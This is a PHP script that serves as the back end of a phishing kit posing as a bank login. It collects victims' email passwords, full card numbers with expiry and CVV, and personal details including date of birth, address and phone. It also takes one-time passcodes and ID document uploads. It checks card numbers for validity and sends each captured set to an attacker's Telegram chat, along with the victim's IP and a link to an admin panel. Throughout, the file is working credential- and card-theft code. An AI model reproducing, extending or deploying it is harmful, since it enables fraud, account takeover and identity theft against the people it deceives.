<?php
error_reporting(0);
session_start();

require_once 'config.php';

function checkRateLimit($ip) {
    if (!ENABLE_RATE_LIMITING) return true;
    
    $rate_file = "logs/rate_limit.json";
    $current_time = time();
    
    if (!file_exists($rate_file)) {
        file_put_contents($rate_file, json_encode([]));
    }
    
    $rate_data = json_decode(file_get_contents($rate_file), true);
    
    foreach ($rate_data as $stored_ip => $data) {
        if ($current_time - $data['last_request'] > RATE_LIMIT_TIME) {
            unset($rate_data[$stored_ip]);
        }
    }
    
    if (isset($rate_data[$ip])) {
        if ($rate_data[$ip]['count'] >= RATE_LIMIT_REQUESTS) {
            return false;
        }
        $rate_data[$ip]['count']++;
        $rate_data[$ip]['last_request'] = $current_time;
    } else {
        $rate_data[$ip] = ['count' => 1, 'last_request' => $current_time];
    }
    
    file_put_contents($rate_file, json_encode($rate_data));
    return true;
}

function logMessage($message) {
    if (!ENABLE_LOGGING) return;
    
    $log_dir = dirname(LOG_FILE);
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0777, true);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[{$timestamp}] {$message}\n";
    file_put_contents(LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);
}

class TelegramBot {
    private $bot_token;
    private $chat_id;
    
    public function __construct($token, $chat_id) {
        $this->bot_token = $token;
        $this->chat_id = $chat_id;
    }
    
    public function sendMessage($message) {
        $url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
        
        $data = array(
            'chat_id' => $this->chat_id,
            'text' => $message
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        // Retry mechanism
        $max_retries = 3;
        $retry_count = 0;
        
        do {
            $result = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curl_error = curl_error($ch);
            
            if ($result !== false && empty($curl_error) && $http_code == 200) {
                break; // Success, exit retry loop
            }
            
            $retry_count++;
            if ($retry_count < $max_retries) {
                sleep(2); // Wait 2 seconds before retry
                file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Retrying Telegram API call (attempt {$retry_count}/{$max_retries})\n", FILE_APPEND);
            }
        } while ($retry_count < $max_retries);
        
        curl_close($ch);
        
        if ($result === false || !empty($curl_error) || $http_code != 200) {
            file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Failed to send message to Telegram after {$max_retries} attempts. cURL Error: " . $curl_error . "\n", FILE_APPEND);
            file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] HTTP Code: " . $http_code . "\n", FILE_APPEND);
            file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] URL: " . $url . "\n", FILE_APPEND);
            file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] POST data: " . print_r($data, true) . "\n", FILE_APPEND);
            logMessage("Failed to send message to Telegram after {$max_retries} attempts");
            return false;
        }
        
        $response = json_decode($result, true);
        if (!$response) {
            file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Invalid JSON response from Telegram API: " . $result . "\n", FILE_APPEND);
            logMessage("Invalid JSON response from Telegram API");
            return false;
        }
        
        file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Telegram API response: " . print_r($response, true) . "\n", FILE_APPEND);
        logMessage("Message sent to Telegram: " . ($response['ok'] ? 'Success' : 'Failed'));
        
        return $response;
    }
    

}

$telegram = new TelegramBot(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

function getClientIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    

    $remote_addr = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if ($remote_addr === '::1' || $remote_addr === '127.0.0.1') {
        return '127.0.0.1'; // Return IPv4 localhost instead of IPv6
    }
    
    return $remote_addr;
}

function getUserAgent() {
    return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
}

function passesLuhn($cardNumber) {
    if (!preg_match('/^\d{13,19}$/', $cardNumber)) {
        return false;
    }

    $sum = 0;
    $shouldDouble = false;

    for ($i = strlen($cardNumber) - 1; $i >= 0; $i--) {
        $digit = (int) $cardNumber[$i];

        if ($shouldDouble) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }

        $sum += $digit;
        $shouldDouble = !$shouldDouble;
    }

    return ($sum % 10) === 0;
}

function formatTelegramMessage($type, $data) {
    $ip = getClientIP();
    $user_agent = getUserAgent();
    $timestamp = date('Y-m-d H:i:s');


    $user_agent_safe = htmlspecialchars(substr($user_agent, 0, 50), ENT_QUOTES, 'UTF-8');

    if (strlen($user_agent) > 50) {
        $user_agent_safe .= "...";
    }
    
    $message = "🏦 New {$type} Login @earthshakinggg\n\n";
    $message .= "🏦 Time: {$timestamp}\n";
    $message .= "🏦 IP: {$ip}\n";
    $message .= "🏦 User Agent: {$user_agent_safe}\n\n";
    
    switch($type) {
        case 'Login':
            $message .= "🏦 Email: " . htmlspecialchars($data['email'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "🏦 Password: " . htmlspecialchars($data['password'], ENT_QUOTES, 'UTF-8') . "\n";
            break;
            
        case 'Card':
            $message .= "👤 Full Name: " . htmlspecialchars($data['fullname'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "💳 Card Number: " . htmlspecialchars($data['card_number'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "📅 Expiry: " . htmlspecialchars($data['expiry'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "🔒 CVV: " . htmlspecialchars($data['cvv'], ENT_QUOTES, 'UTF-8') . "\n";
            break;
            
        case 'Personal':
            if (isset($data['billing_info'])) {
                $message .= "🏦 Billing Info: " . htmlspecialchars($data['billing_info'], ENT_QUOTES, 'UTF-8') . "\n";
            } else {
                $message .= "🏦 Name: " . htmlspecialchars($data['first_name'], ENT_QUOTES, 'UTF-8') . " " . htmlspecialchars($data['last_name'], ENT_QUOTES, 'UTF-8') . "\n";
                $message .= "🏦 Phone: " . htmlspecialchars($data['phone'], ENT_QUOTES, 'UTF-8') . "\n";
                $message .= "🏦 DOB: " . htmlspecialchars($data['dob'], ENT_QUOTES, 'UTF-8') . "\n";
                $message .= "🏦 Address: " . htmlspecialchars($data['address'], ENT_QUOTES, 'UTF-8') . "\n";
                $message .= "🏦 State: " . htmlspecialchars($data['state'], ENT_QUOTES, 'UTF-8') . "\n";
                $message .= "🏦 ZIP: " . htmlspecialchars($data['zip'], ENT_QUOTES, 'UTF-8') . "\n";
            }
            break;
            
        case 'Email Link':
            $message .= "🏦 Email: " . htmlspecialchars($data['email'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "🏦 Password: " . htmlspecialchars($data['password'], ENT_QUOTES, 'UTF-8') . "\n";
            break;
            
        case 'Code':
            $message .= "🏦 Code: " . htmlspecialchars($data['code'], ENT_QUOTES, 'UTF-8') . "\n";
            $message .= "🏦 Type: " . htmlspecialchars($data['type'], ENT_QUOTES, 'UTF-8') . "\n";
            break;
    }
    
    return $message;
}

if (isset($_SERVER['SCRIPT_FILENAME']) && basename(__FILE__) !== basename($_SERVER['SCRIPT_FILENAME'])) {
    return;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $client_ip = getClientIP();
    
    if (!checkRateLimit($client_ip)) {
        http_response_code(429);
        echo json_encode(['success' => false, 'message' => 'Too many requests. Please try again later.']);
        exit;
    }
    
    $response = array('success' => false, 'message' => '');
    
    try {
        logMessage("New form submission from IP: {$client_ip}");
        

        $user_ip = $client_ip;
        

        
        if (isset($_POST['action'])) {
            switch($_POST['action']) {
                case 'login':
                    $data = array(
                        'email' => filter_var($_POST['_user'], FILTER_SANITIZE_EMAIL),
                        'password' => $_POST['_pass']
                    );
                    $message = formatTelegramMessage('Login', $data);
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    $telegram_response = $telegram->sendMessage($message);
                    break;
                    
                case 'email_password':
                    $data = array(
                        'email' => filter_var($_POST['email'], FILTER_SANITIZE_EMAIL),
                        'password' => $_POST['_MLpass']
                    );
                    $message = formatTelegramMessage('Email Link', $data);
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    $telegram_response = $telegram->sendMessage($message);
                    break;
                    
                case 'billing':
                    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Billing case triggered. POST data: " . print_r($_POST, true) . "\n", FILE_APPEND);
                    $billing_data = $_POST['bl_data'];
                    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Billing data: " . $billing_data . "\n", FILE_APPEND);
                    $data = array(
                        'billing_info' => $billing_data
                    );
                    $message = formatTelegramMessage('Personal', $data);
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Formatted message: " . $message . "\n", FILE_APPEND);
                    $telegram_response = $telegram->sendMessage($message);
                    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Telegram response: " . print_r($telegram_response, true) . "\n", FILE_APPEND);
                    break;
                    
                case 'card':
                    $data = array(
                        'fullname' => filter_var($_POST['fullname'], FILTER_SANITIZE_STRING),
                        'card_number' => preg_replace('/\D/', '', $_POST['card_number']),
                        'expiry' => filter_var($_POST['expiry'], FILTER_SANITIZE_STRING),
                        'cvv' => filter_var($_POST['cvv'], FILTER_SANITIZE_STRING)
                    );
                    if (!passesLuhn($data['card_number'])) {
                        $response['status'] = 'error';
                        $response['message'] = 'Invalid card number provided.';
                        echo json_encode($response);
                        exit;
                    } else {
                        $message = formatTelegramMessage('Card', $data);

                        $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                        $message .= "\n <b>Admin Panel:</b>\n";
                        $message .= $admin_link . "\n";

                        $telegram_response = $telegram->sendMessage($message);
                    }
                    break;
                    
                case 'code':
                    $data = array(
                        'code' => $_POST['kode'],
                        'type' => isset($_POST['type']) ? $_POST['type'] : 'OTP'
                    );
                    $message = formatTelegramMessage('Code', $data);
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    $telegram_response = $telegram->sendMessage($message);
                    break;
                    
                case 'otp':
                    $data = array(
                        'code' => $_POST['otp_code'],
                        'type' => 'OTP'
                    );
                    $message = formatTelegramMessage('Code', $data);
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    $telegram_response = $telegram->sendMessage($message);
                    break;
                    
                case 'documents':
                    $message = "📄 Document Upload\n";
                    $message .= "🌐 IP: {$client_ip}\n";
                    $message .= "👤 User Agent: " . getUserAgent() . "\n\n";
                    

                    $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                    $message .= "\n <b>Admin Panel:</b>\n";
                    $message .= $admin_link . "\n";
                    
                    if (ENABLE_FILE_UPLOADS) {
                        $uploaded_files = array();
                        
                        foreach (['front_doc', 'back_doc', 'self_doc'] as $file_key) {
                            if (isset($_FILES[$file_key]) && $_FILES[$file_key]['error'] === UPLOAD_ERR_OK) {
                                $file_name = sanitizeFileName($_FILES[$file_key]['name']);
                                $upload_path = UPLOAD_DIR . $file_name;
                                
                                if (move_uploaded_file($_FILES[$file_key]['tmp_name'], $upload_path)) {
                                    $uploaded_files[] = $upload_path;
                             
                                    unlink($upload_path);
                                }
                            }
                        }
                    }
                    break;
                    
                default:
                    $response['message'] = 'Unknown action';
                    break;
            }
        } elseif (isset($_POST['email']) && isset($_POST['password']) && !isset($_POST['card_number'])) {
            $data = array(
                'email' => filter_var($_POST['email'], FILTER_SANITIZE_EMAIL),
                'password' => $_POST['password']
            );
            $message = formatTelegramMessage('Login', $data);
            

            $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
            $message .= "\n <b>Admin Panel:</b>\n";
            $message .= $admin_link . "\n";
            
            $telegram_response = $telegram->sendMessage($message);
            
        } elseif (isset($_POST['card_number'])) {
            $data = array(
                'card_number' => preg_replace('/\D/', '', $_POST['card_number']),
                'expiry' => $_POST['expiry'],
                'cvv' => $_POST['cvv']
            );
            $message = formatTelegramMessage('Card', $data);
            $telegram_response = $telegram->sendMessage($message);
            
        } elseif (isset($_POST['first_name'])) {
            $data = array(
                'first_name' => filter_var($_POST['first_name'], FILTER_SANITIZE_STRING),
                'last_name' => filter_var($_POST['last_name'], FILTER_SANITIZE_STRING),
                'phone' => preg_replace('/\D/', '', $_POST['phone']),
                'dob' => $_POST['dob'],
                'address' => filter_var($_POST['address'], FILTER_SANITIZE_STRING),
                'state' => filter_var($_POST['state'], FILTER_SANITIZE_STRING),
                'zip' => $_POST['zip']
            );
            $message = formatTelegramMessage('Personal', $data);
            

            $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
            $message .= "\n <b>Admin Panel:</b>\n";
            $message .= $admin_link . "\n";
            
            $telegram_response = $telegram->sendMessage($message);
            
        } elseif (isset($_POST['email_link'])) {
            $data = array(
                'email' => filter_var($_POST['email_link'], FILTER_SANITIZE_EMAIL),
                'password' => $_POST['password_link']
            );
            $message = formatTelegramMessage('Email Link', $data);
            

            $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
            $message .= "\n <b>Admin Panel:</b>\n";
            $message .= $admin_link . "\n";
            
            $telegram_response = $telegram->sendMessage($message);
            
        } elseif (isset($_POST['card_number'])) {
            $data = array(
                'card_number' => preg_replace('/\D/', '', $_POST['card_number']),
                'expiry' => filter_var($_POST['expiry'], FILTER_SANITIZE_STRING),
                'cvv' => filter_var($_POST['cvv'], FILTER_SANITIZE_STRING)
            );
            $message = formatTelegramMessage('Card', $data);
            
            $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
            $message .= "\n <b>Admin Panel:</b>\n";
            $message .= $admin_link . "\n";
            
            $telegram_response = $telegram->sendMessage($message);
        }
        
        if (isset($_FILES) && !empty($_FILES) && ENABLE_FILE_UPLOADS) {
            foreach ($_FILES as $key => $file) {
                if ($file['error'] === UPLOAD_ERR_OK) {
                    $upload_dir = 'uploads/';
                    if (!is_dir($upload_dir)) {
                        mkdir($upload_dir, 0777, true);
                    }
                    
                    $filename = time() . '_' . preg_replace('/[^a-zA-Z0-9._-]/', '', $file['name']);
                    $filepath = $upload_dir . $filename;
                    
                    if (move_uploaded_file($file['tmp_name'], $filepath)) {
                        // File uploaded but not sent to Telegram (sendDocument removed)
                        
                        if (file_exists($filepath)) {
                            unlink($filepath);
                        }
                        
                        logMessage("Document uploaded: {$filename}");
                    }
                }
            }
        }
        
        if (isset($telegram_response) && is_array($telegram_response) && $telegram_response['ok']) {
            $response['success'] = true;
            $response['status'] = 'success';
            $response['message'] = 'Data sent successfully';
            logMessage("Form submission successful from IP: {$client_ip}");
        } elseif (isset($_POST['action'])) {
            $response['success'] = false;
            $response['status'] = 'error';
            $response['message'] = 'Failed to send data to Telegram';
            logMessage("Form submission failed from IP: {$client_ip}");
        }
        
    } catch (Exception $e) {
        $response['message'] = 'Error: ' . $e->getMessage();
        logMessage("Error processing form: " . $e->getMessage());
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

header('Location: index.php');
exit;
?>